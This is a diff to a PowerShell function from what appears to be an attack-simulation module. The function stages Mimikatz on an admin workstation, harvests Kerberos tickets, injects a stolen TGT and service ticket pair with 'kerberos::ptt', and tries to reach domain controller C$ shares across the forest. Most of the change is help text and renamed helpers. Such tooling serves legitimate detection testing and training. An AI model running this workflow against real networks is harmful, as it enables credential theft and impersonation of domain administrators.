@@ -1,9 +1,39 @@
+<#
+.SYNOPSIS
+Harvests and reuses Kerberos tickets in the AS2Go Pass-the-Ticket demonstration.
+
+.DESCRIPTION
+Reads the configured admin workstation and ticket share, stages Mimikatz there, and harvests Kerberos tickets.
+Analyzes .kirbi files, summarizes available accounts, and recommends an account with a TGT and service ticket.
+Allows another candidate, copies its tickets, and selects a suitable pair for injection with Mimikatz.
+Displays cached tickets and attempts to enumerate DC C$ shares across forest domains using the resulting context.
+
+.EXAMPLE
+Invoke-PassTheTicketAttack
+Runs this workflow using the initialized AS2Go module configuration.
+
+.INPUTS
+None. This function does not declare pipeline input.
+
+.OUTPUTS
+Console messages and output from invoked commands; no dedicated result object is defined.
+
+.NOTES
+Private AS2Go function. Run from an initialized AS2Go module session.
+Requires initialized workstation/share settings, Mimikatz, remoting access, and usable tickets.
+The workflow clears existing ticket staging locations before collecting new tickets.
+
+.COMPONENT
+Category: Main Function
+
+.FUNCTIONALITY
+Harvests Kerberos tickets on the configured admin workstation and reviews available ticket identities.
+Selects and injects a TGT and service-ticket pair to demonstrate impersonation without the account password.
+Inspects cached tickets and attempts to list domain controller admin shares across the forest.
+#>
 function Invoke-PassTheTicketAttack {
     
-    $CurrentFunction = Get-FunctionName
-    Write-Log -Message "### Start Function $CurrentFunction ###"
-    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
-    #################### main code | out- host #####################
+    $Info = Measure-FunctionRuntime -Begin
 
     $Script:ASSAW = Get-ASConfig -Setting "mySAW"
     $Script:ASTicketsUNCPath = Get-ASConfig -Setting "ticketsPath"
@@ -18,11 +48,11 @@ function Invoke-PassTheTicketAttack {
     
     If (-not $SkipClearHost) { Clear-Host }
     
-    Invoke-output -Type Header -Message "Pass-the-Ticket (PtT) Attack"
-    Invoke-output -Type H1 -Message "This attack simulates a Pass-the-Ticket (PtT) attack, where stolen Kerberos tickets are used to impersonate a user and access resources on the network. `nIn this case, we will attempt to use stolen tickets to access the Domain Controller's c$ share and list NetBIOS sessions.`n"
-    Invoke-output -Type Bullet -Message "Step #1 - stage mimikatz on Admin PC"
-    Invoke-output -Type Bullet -Message "Step #2 - harvest tickets on Admin PC"
-    Invoke-output -Type Bullet -Message "Step #3 - run PtT to become Domain Admin"
+    Write-AS2GoOutput -Type Header -Message "Pass-the-Ticket (PtT) Attack"
+    Write-AS2GoOutput -Type H1 -Message "This attack simulates a Pass-the-Ticket (PtT) attack, where stolen Kerberos tickets are used to impersonate a user and access resources on the network. `nIn this case, we will attempt to use stolen tickets to access the Domain Controller's c$ share and list NetBIOS sessions.`n"
+    Write-AS2GoOutput -Type Bullet -Message "Step #1 - stage mimikatz on Admin PC"
+    Write-AS2GoOutput -Type Bullet -Message "Step #2 - harvest tickets on Admin PC"
+    Write-AS2GoOutput -Type Bullet -Message "Step #3 - run PtT to become Domain Admin"
 
     #
     If ($UnAttended) { Start-Sleep 2 } else { 
@@ -47,7 +77,7 @@ function Invoke-PassTheTicketAttack {
   
     
         If ($decision -eq $Script:No) {
-            Invoke-Output -Type Quit -Message "Admin PC is not ready for the Pass-the-Ticket (PtT) attack."
+            Write-AS2GoOutput -Type Quit -Message "Admin PC is not ready for the Pass-the-Ticket (PtT) attack."
             return
         }
     }
@@ -68,9 +98,9 @@ function Invoke-PassTheTicketAttack {
 
     ###############################################################################################################################
 
-    Invoke-output -Type Header -Message "Stage mimikatz on Admin PC $Script:ASSAW"
+    Write-AS2GoOutput -Type Header -Message "Stage mimikatz on Admin PC $Script:ASSAW"
 
-    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
+    Write-AS2GoOutput -Type Command -Message "Next Command: " -NoNewline
     $command = "Copy-Item -Path $tool1 -Destination $TicketsSourcePath  -Recurse"
     Write-Syntax -Code $command
 
@@ -87,10 +117,10 @@ function Invoke-PassTheTicketAttack {
 
     If ($result) {
         $result | Select-Object FullName, LastWriteTime | Out-Host
-        Invoke-Output -Type Success -Message "File staging on the admin PC succeeded."
+        Write-AS2GoOutput -Type Success -Message "File staging on the admin PC succeeded."
     }
     else {
-        Invoke-Output -Type Error -Message "File staging on the admin PC failed."
+        Write-AS2GoOutput -Type Error -Message "File staging on the admin PC failed."
         return
     }
 
@@ -100,9 +130,9 @@ function Invoke-PassTheTicketAttack {
 
     
     ####################################################################################################################################
-    Invoke-output -Type Header -Message "harvest tickets on Admin PC $Script:ASSAW"
+    Write-AS2GoOutput -Type Header -Message "harvest tickets on Admin PC $Script:ASSAW"
 
-    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
+    Write-AS2GoOutput -Type Command -Message "Next Command: " -NoNewline
     
     $command = '
     Invoke-Command -Session $session -ScriptBlock {
@@ -144,11 +174,11 @@ function Invoke-PassTheTicketAttack {
 
     If ($alltickets) {
         write-host "`n"
-        Invoke-Output -Type Success -Message "Kerberos ticket harvesting on the admin PC succeeded. `
+        Write-AS2GoOutput -Type Success -Message "Kerberos ticket harvesting on the admin PC succeeded. `
        $($alltickets.Count) 'kirbi' files were found in: $TicketsSourcePath" -NoExtraLines
     }
     else {
-        Invoke-Output -Type Error -Message "Kerberos ticket harvesting on the admin PC failed. `
+        Write-AS2GoOutput -Type Error -Message "Kerberos ticket harvesting on the admin PC failed. `
              No 'kirbi' files were found in: ` 
              $TicketsSourcePath"
         return
@@ -183,7 +213,7 @@ function Invoke-PassTheTicketAttack {
     Select-Object -First 1
 
     $candidate = $bestPtTUser.principal
-    Invoke-Output -Type Textmaker -Message "Because both a TGT and a service ticket were present,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate
+    Write-AS2GoOutput -Type Textmaker -Message "Because both a TGT and a service ticket were present,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate
 
     $title = "Confirm or change the account whose tickets will be copied"
     $message = ">> $candidate"
@@ -201,10 +231,10 @@ function Invoke-PassTheTicketAttack {
     Write-Host
 
     If ($answer -eq "New") {
-        $candidate = Invoke-Output -Type Input -Message "Enter the new candidate"
+        $candidate = Write-AS2GoOutput -Type Input -Message "Enter the new candidate"
     }
 
-    Invoke-output -Type Header -Message "Copy tickets from Admin PC for candidate '$candidate'"
+    Write-AS2GoOutput -Type Header -Message "Copy tickets from Admin PC for candidate '$candidate'"
     #If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
 
@@ -221,10 +251,10 @@ function Invoke-PassTheTicketAttack {
     If ($results) {
         write-host "`n"
         $results | Format-Table Name
-        Invoke-Output -Type Success -Message "$($results.Count) 'kirbi' files were copied to: $TicketsTargetPath" -NoExtraLines
+        Write-AS2GoOutput -Type Success -Message "$($results.Count) 'kirbi' files were copied to: $TicketsTargetPath" -NoExtraLines
     }
     else {
-        Invoke-Output -Type Error -Message "Copying tickets from $TicketsSourcePath on the admin PC failed."
+        Write-AS2GoOutput -Type Error -Message "Copying tickets from $TicketsSourcePath on the admin PC failed."
         return
     }
 
@@ -236,7 +266,7 @@ function Invoke-PassTheTicketAttack {
     #$bestresult.TicketPairs   | Format-Table Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile -AutoSize
     $selectedPair = $bestresult.TicketPairs   | Select-Object -First 1
 
-    invoke-output -Type H1 -Message "`nBest Ticket Pair Identified"
+    Write-AS2GoOutput -Type H1 -Message "`nBest Ticket Pair Identified"
     $selectedPair | Format-list  Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile | out-host
 
     $4logfile = $selectedPair | Format-list  Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile | Out-String
@@ -258,8 +288,8 @@ function Invoke-PassTheTicketAttack {
     If (-not $SkipClearHost) { Clear-Host }
 
 
-    Invoke-Output -Type Header -Message "load stolen tickets from candidate '$candidate'"
-    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
+    Write-AS2GoOutput -Type Header -Message "load stolen tickets from candidate '$candidate'"
+    Write-AS2GoOutput -Type Command -Message "Next Command: " -NoNewline
     $command = [string]::Format('.\mimikatz.exe  "privilege::debug" "kerberos::ptt {0}" "exit"', $TicketsToAbusePath)
     Write-Syntax -Code $command
 
@@ -273,8 +303,8 @@ function Invoke-PassTheTicketAttack {
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     If (-not $SkipClearHost) { Clear-Host }
 
-    Invoke-Output -Type Header -Message "Display currently cached Kerberos tickets"
-    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
+    Write-AS2GoOutput -Type Header -Message "Display currently cached Kerberos tickets"
+    Write-AS2GoOutput -Type Command -Message "Next Command: " -NoNewline
     $command = "klist"
     Write-Syntax -Code $command
     
@@ -283,20 +313,20 @@ function Invoke-PassTheTicketAttack {
    
     $tickets = Get-KlistTicket -Client $candidate
     $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
-    Invoke-Output -Type textmaker -Message "Last Ticket for client" -tm "$candidate"
+    Write-AS2GoOutput -Type textmaker -Message "Last Ticket for client" -tm "$candidate"
     $tickets | Select-object -Last 1 | Format-List
 
     if ($tickets.Count -eq 0) {
-        Invoke-Output -Type Error -Message "No Kerberos tickets found for client '$candidate'"
+        Write-AS2GoOutput -Type Error -Message "No Kerberos tickets found for client '$candidate'"
     }
     else {
-        Invoke-Output -Type Success -Message "Kerberos tickets found for client '$candidate'"
+        Write-AS2GoOutput -Type Success -Message "Kerberos tickets found for client '$candidate'"
     }
     
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     If (-not $SkipClearHost) { Clear-Host }
       
-    Invoke-Output -Type Header -Message "Attempting to access a domain controller’s C$ share in each domain"
+    Write-AS2GoOutput -Type Header -Message "Attempting to access a domain controller’s C$ share in each domain"
 
     Foreach ($domain in  (Get-ADForest).domains) {
         $DC = Get-BestDomainController -Domain $domain
@@ -307,8 +337,5 @@ function Invoke-PassTheTicketAttack {
     
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
-    ######################## main code ############################
-    $runtime = Get-RunTime -StartRunTime $StartRunTime
-    Write-Log -Message "    Run Time: $runtime [h] ###"
-    Write-Log -Message "### End Function $CurrentFunction ###"
+    Measure-FunctionRuntime -End -Details $Info
 }
